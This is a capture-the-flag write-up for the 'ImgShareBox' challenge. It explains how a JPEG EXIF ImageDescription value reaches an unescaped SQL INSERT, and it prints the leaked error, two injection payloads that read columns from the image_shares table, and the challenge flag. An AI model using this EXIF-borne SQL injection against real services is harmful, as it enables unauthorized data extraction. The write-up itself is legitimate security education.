# ImgShareBox 

## Description 
We created a new cool service that allows you to share your images with everyone (it's on beta now)! The only thing you need to share something is an Image Description! Happy sharing!  
[service](https://img.ctf.bz/)  

## Vulnerability 
Basically, service is an App working with DropBox in background fetching images (jpeg/jpg) from a specific path, `/App/ImgShareBox` to User's shares. From the challenge description we can find understand it somehow parses JPEG EXIF headers and looks for ImageDescription (`0x10e`).  

Then simply I used pillow and piexif packages to parse EXIF headers and update image comment. At first I thought it may be some sort of XSS challenge, but then it turned out to be a SQL injection.  

Error content was base64 encoded but when I tried to decode, it generated error about padding, then I realized `imgsb` appended to the beginning of content is garbage.  

```
(_mysql_exceptions.ProgrammingError) (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'https://www.dropbox.com/s/z27nuuim6zgqo0i/test.jpg?dl=0&raw=1', '0')' at line 1") [SQL: "INSERT INTO `image_shares` (`owner`, `description`, `image_link`, `approved`) VALUES ('dbid:AADp6iAAiOSPQ9EBcI6XyyXOGX18YWaRVT8', ''', 'https://www.dropbox.com/s/z27nuuim6zgqo0i/test.jpg?dl=0&raw=1', '0')"] (Background on this error at: http://sqlalche.me/e/f405)"'")
```  

Our single quote payload located in the middle of an INSERT INTO query. so we have control over query and now let's change `image_link` to point the flag. I spent sometime enumerating all columns and tables in the `image_shares` table. Then I tried to dump all information for very first post.  

```python
set_desc(img, '\', (select concat_ws(0x3a, owner, image_link) from image_shares as a where id=1), 0)-- ')
upload()
```  

```python
set_desc(img, '\', (select concat_ws(0x3a, owner, description) from image_shares as a where id=1), 0)-- ')
upload()
```  

You can find flag under class `card-avatar`:  

`ctfzone{b4827d53d3faa0b3d6f20d73df5e280f}`  

![flag_image](https://source.unsplash.com/random/454x409?water,cat,nature)  

Sincerely,  
@pwnslinger :shell: :fish: (@shellphish)  
